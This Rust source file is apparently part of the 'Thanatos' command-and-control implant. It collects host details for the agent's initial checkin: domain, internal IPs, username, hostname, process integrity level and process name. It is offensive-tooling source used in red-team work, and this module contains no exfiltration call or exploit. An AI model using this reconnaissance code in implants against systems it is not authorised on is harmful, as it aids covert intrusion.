//! Enumerates information about the current host. This includes all of the information for the
//! initial checkin.

use crate::{errors::ThanatosError, windows::winhelpers::IpAdapters};
use std::{
    ffi::CStr,
    os::windows::io::{AsHandle, AsRawHandle, HandleOrInvalid, OwnedHandle},
};

use windows::{
    core::PSTR,
    Win32::{
        Foundation::{
            GetLastError, ERROR_INSUFFICIENT_BUFFER, ERROR_MORE_DATA, HANDLE, HMODULE, MAX_PATH,
        },
        NetworkManagement::IpHelper::{IF_TYPE_IEEE80211, MIB_IF_TYPE_ETHERNET},
        Security::{
            GetSidSubAuthority, GetSidSubAuthorityCount, GetTokenInformation, TokenIntegrityLevel,
            TOKEN_MANDATORY_LABEL, TOKEN_QUERY,
        },
        System::{
            LibraryLoader::GetModuleFileNameA,
            SystemInformation::{
                ComputerNameDnsDomain, ComputerNameDnsHostname, GetComputerNameExA,
            },
            Threading::{GetCurrentProcess, OpenProcessToken},
            WindowsProgramming::GetUserNameA,
        },
    },
};

/// Get the domain name of the current system
pub fn domain() -> Result<String, ThanatosError> {
    let mut domain_name_len = 0;

    match unsafe {
        GetComputerNameExA(
            ComputerNameDnsDomain,
            PSTR(std::ptr::null_mut()),
            &mut domain_name_len,
        )
    }
    .ok()
    {
        Err(_) if unsafe { GetLastError() } == ERROR_MORE_DATA => (),
        Err(_) => {
            crate::log!("{:?}", unsafe { GetLastError() });
            return Err(ThanatosError::os_error());
        }
        _ => return Err(ThanatosError::os_error()),
    }

    let mut domain_name_buffer = vec![0u8; domain_name_len as usize];

    unsafe {
        GetComputerNameExA(
            ComputerNameDnsDomain,
            PSTR(domain_name_buffer.as_mut_ptr()),
            &mut domain_name_len,
        )
    }
    .ok()
    .map_err(|_| ThanatosError::os_error())?;

    domain_name_buffer.pop();

    std::str::from_utf8(&domain_name_buffer)
        .map_err(|_| ThanatosError::StringParseError)
        .map(|s| s.to_string())
}

/// Gets the internal IP addresses for Windows
pub fn internal_ips() -> Result<Vec<String>, ThanatosError> {
    Ok(IpAdapters::new()?
        .into_iter()
        .filter_map(|adapter| {
            // Only get ethernet and wireless interfaces which have a gateway IP set
            (adapter.Type == MIB_IF_TYPE_ETHERNET || adapter.Type == IF_TYPE_IEEE80211)
                .then(|| {
                    (adapter.GatewayList.IpAddress.String != [0u8; 16])
                        .then(|| {
                            CStr::from_bytes_until_nul(&adapter.IpAddressList.IpAddress.String)
                                .ok()
                                .map(|s| s.to_string_lossy().to_string())
                        })
                        .flatten()
                })
                .flatten()
        })
        .collect())
}

/// Gets the current platform information
pub fn platform() -> String {
    "Windows".to_string()
}

/// Gets the generic platform for the system
#[inline]
pub fn generic_platform() -> String {
    platform()
}

/// Gets the username associated with the current process
pub fn username() -> Result<String, ThanatosError> {
    let mut username_length = 0u32;

    match unsafe { GetUserNameA(PSTR(std::ptr::null_mut()), &mut username_length) }.ok() {
        Err(_) if unsafe { GetLastError() } == ERROR_INSUFFICIENT_BUFFER => (),
        _ => return Err(ThanatosError::os_error()),
    }

    let mut username_buffer = vec![0u8; username_length as usize];

    unsafe { GetUserNameA(PSTR(username_buffer.as_mut_ptr()), &mut username_length) }
        .ok()
        .map_err(|_| ThanatosError::os_error())?;

    let user =
        std::str::from_utf8(&username_buffer).map_err(|_| ThanatosError::StringParseError)?;

    Ok(user.trim_end_matches('\0').to_string())
}

/// Gets the hostname for the system
pub fn hostname() -> Result<String, ThanatosError> {
    let mut hostname_length = 0u32;

    match unsafe {
        GetComputerNameExA(
            ComputerNameDnsHostname,
            PSTR(std::ptr::null_mut()),
            &mut hostname_length,
        )
    }
    .ok()
    {
        Err(_) if unsafe { GetLastError() } == ERROR_MORE_DATA => (),
        Err(_) => {
            crate::log!("{:?}", unsafe { GetLastError() });
            return Err(ThanatosError::os_error());
        }
        _ => return Err(ThanatosError::os_error()),
    }

    let mut hostname_buffer = vec![0u8; hostname_length as usize];

    unsafe {
        GetComputerNameExA(
            ComputerNameDnsHostname,
            PSTR(hostname_buffer.as_mut_ptr()),
            &mut hostname_length,
        )
    }
    .ok()
    .map_err(|_| ThanatosError::os_error())?;

    hostname_buffer.pop();

    std::str::from_utf8(&hostname_buffer)
        .map_err(|_| ThanatosError::StringParseError)
        .map(|s| s.to_string())
}

/// Gets the current process' integrity level from the process token
pub fn integrity_level() -> Result<u32, ThanatosError> {
    let token_handle = -1isize;

    unsafe { OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut HANDLE(token_handle)) }
        .ok()
        .map_err(|_| ThanatosError::os_error())?;

    // Convert the token handle to a Rust `OwnedHandle`. This will call `CloseHandle` when the
    // value is dropped.
    //
    // First, convert the raw isize handle to a `HandleOrInvalid`. This needs to be
    // unsafe because converting raw values to handles is unsafe in nature.
    //
    // Second, convert the `HandleOrInvalid` to a `OwnedHandle`. The reason for using
    // `HandleOrInvalid` as an intermediary is because this pattern will ensure that
    // the handle is not INVALID_HANDLE_VALUE regardless of the return value from
    // `OpenProcessToken` above.
    //
    // From here, `token_handle` now contains an "owned" handle value which can follow
    // Rust's borrowing semantics AND will drop the handle with `CloseHandle` when it goes out of
    // scope.
    let token_handle =
        OwnedHandle::try_from(unsafe { HandleOrInvalid::from_raw_handle(token_handle as _) })
            .map_err(|_| ThanatosError::InvalidHandle)?;

    let mut token_info_length = std::mem::size_of::<TOKEN_MANDATORY_LABEL>() as u32;

    match unsafe {
        GetTokenInformation(
            // Take the `OwnedHandle` and borrow it using `as_handle()` this signifies to the Rust
            // compiler that the handle is being "borrowed" by the function call and not owned in
            // case the windows `HANDLE` tuple struct tries to clone it.
            //
            // Then convert the handle to a raw handle so that it can be converted to an isize
            // since the windows crate requires handles to be an isize for some reason.
            HANDLE(token_handle.as_handle().as_raw_handle() as _),
            TokenIntegrityLevel,
            None,
            0,
            &mut token_info_length,
        )
    }
    .ok()
    {
        Err(_) if unsafe { GetLastError() } == ERROR_INSUFFICIENT_BUFFER => (),
        _ => return Err(ThanatosError::os_error()),
    }

    let mut token_info = vec![0u8; token_info_length as usize];

    unsafe {
        GetTokenInformation(
            // Same as above.
            HANDLE(token_handle.as_handle().as_raw_handle() as _),
            TokenIntegrityLevel,
            Some(token_info.as_mut_ptr().cast()),
            token_info_length,
            &mut token_info_length,
        )
    }
    .ok()
    .map_err(|_| ThanatosError::os_error())?;

    let token_info: &TOKEN_MANDATORY_LABEL = unsafe { &*token_info.as_ptr().cast() };

    let sid_count = unsafe { (*GetSidSubAuthorityCount(token_info.Label.Sid)) as u32 - 1 };
    let integrity_level_info = unsafe { *GetSidSubAuthority(token_info.Label.Sid, sid_count) };

    Ok(integrity_level_info >> 12)
}

/// Get the name of the current process
pub fn process_name() -> Result<String, ThanatosError> {
    let mut process_path = [0u8; MAX_PATH as usize];
    let ret = unsafe { GetModuleFileNameA(HMODULE(0), &mut process_path) };

    let process_path = std::str::from_utf8(&process_path[..ret as usize])
        .map_err(|_| ThanatosError::StringParseError)?
        .to_string();

    process_path
        .split(r"\")
        .last()
        .ok_or(ThanatosError::StringParseError)
        .map(|s| s.to_string())
}
